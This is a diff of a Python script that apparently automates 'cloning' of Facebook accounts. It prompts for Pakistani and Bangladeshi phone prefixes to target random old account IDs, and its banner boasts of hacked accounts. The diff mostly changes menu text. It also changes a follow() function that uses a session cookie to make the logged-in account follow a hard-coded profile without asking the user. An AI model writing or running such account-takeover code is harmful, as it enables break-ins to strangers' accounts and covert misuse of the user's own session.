@@ -16,9 +16,10 @@ def o():
   #  ip = requests.get("https://api.ipify.org").text
   #  jalan("     \033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mIP ADDRES \033[38;5;196m: \033[1;32m"+ip)
   #   print("     \033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m-\033[1;32m-\033[1;33m-\033[38;5;196m-")
-    jalan("  \033[1;91m[\033[1;92m01\033[1;91m]\033[1;92mSTART RANDOM CLONING   ")
+    jalan("  \033[1;91m[\033[1;92m01\033[1;91m]\033[1;92mSTART OLD ID RANDOM CLONING   ")
     # print("  \033[1;91m[\033[1;92m02\033[1;91m]\033[1;92mCONTACT ADMIN")
     print("  \033[1;91m[\033[1;92m02\033[1;91m]\033[1;92mJOIN MY GROUP ")
+    print("  \033[1;91m[\033[1;92m02\033[1;91m]\033[1;92mVIEW YOUTUBE CHANNEL ")
     print("  \033[1;91m[\033[1;92mE\033[1;91m]\033[1;92mExit")
     Mahin = input('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92mSELECT MENU \033[38;5;196m: ')
     if Mahin == '1':
@@ -50,7 +51,7 @@ except ModuleNotFoundError:
     
 
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100005339506289', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -127,17 +128,18 @@ logo=("""
                                           
   [ JOIN MY FACEBOOK GROUP AND MORE NEW COMMAND ] 
    
-        \033[1;91m Welcome To My Dark FixNeT 67 Team##!!\033[1;92m     
+        \033[1;91m Welcome To My Dark FixNeT 67 Team \033[1;92m     
     
         \033[1;94mFIND YOUR OWN PATH
     FUck Your Attitude.........Hacked...Facebook...Account...   \033[1;32m                                    
 ══════════════════════════════════════════════════════           
- [⭕] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊: Https.Xisan67.net
- [⭕] 𝐆𝐫𝐨𝐮𝐩:  DARK FIXNET 67 TEAM
- [⭕] 𝐆𝐈𝐓𝐇𝐔𝐁   :  Xisan-67
- [⭕] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏: +880175725****
- [⭕] Xisan :  ════ Version ════════ 1.0.2
- [⭕] 𝐓𝐎𝐎𝐋𝐒           :  BD-PK- India Random 
+ [🟡] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊: Https.Xisan67.net
+ [🟡] 𝐆𝐫𝐨𝐮𝐩:  DARK FIXNET 67 TEAM
+ [🟡] 𝐆𝐈𝐓𝐇𝐔𝐁   :  Xisan-67
+ [🟡] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏: +880175725****
+ [🟡] YouTube  :  Dark FixNeT 67
+ [🟡] XISAN :  ════ Version ════════ 1.0.2
+ [🟡] 𝐓𝐎𝐎𝐋𝐒           : Old ID 6/7/8/9/10/11/12 Random 
 ══════════════════════════════════════════════════════                   
 """) 
 try:
@@ -214,8 +216,8 @@ def i():
     print(logo)
     print("            \033[1;92m8 DIGIT \033[1;95mCLONING \033[97;1m[\033[92;1mENJOY\033[97;1m]")
     print(" \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱")
-    print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m PK CODE    \033[38;5;196m:\033[1;92m 92301 92302 92303 92305')
-    print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m BD CODE    \033[38;5;196m:\033[1;92m 88016 88017 88018 88019')
+    print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m PK CODE    \033[38;5;196m:\033[1;92m 92301, 92302, 92303, 92305')
+    print('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m BD CODE    \033[38;5;196m:\033[1;92m +88016, +88017, +88018, +88019')
     print(" \033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱")
     code = input('  \033[1;91m[\033[1;92m●\033[1;91m]\033[1;92m INPUT CODE \033[1;97m: ')
     print("")
